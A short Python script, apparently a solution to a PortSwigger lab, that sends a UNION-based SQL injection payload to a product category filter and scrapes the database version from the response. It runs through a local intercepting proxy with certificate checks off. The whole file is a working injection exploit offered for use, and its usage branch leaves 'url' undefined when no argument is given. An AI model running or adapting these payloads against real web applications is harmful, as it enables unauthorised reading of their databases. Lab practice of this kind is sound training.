import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }


def main(url):
    path = "filter?category=Pets"
    payload = "' union select null,version()%23"
    req = requests.get(url + path + payload, verify=False, proxies=proxies)
    if req.status_code == 200:
        text = req.text
        soup = BeautifulSoup(text, "html.parser")
        
        # Find all <td> elements
        td_elements = soup.find_all('td')
        
        # Iterate over the <td> elements
        for td in td_elements:
            if "ubuntu" in td.text.lower():
                # This <td> contains the database version information
                print("Database version:", td.text.strip())
                return True
        print("Unable to find the database version.")
        return False

    




if __name__ == "__main__":
    try:
        url=sys.argv[1]
    except IndexError:
        print("[-] Usage %s <url>"%sys.argv[0])
        print("[-] Example %s www.portswigger.com"%sys.argv[0])

    if not main(url):
        print("Unable to get the database version ..")
        print("Ending up the session")

    

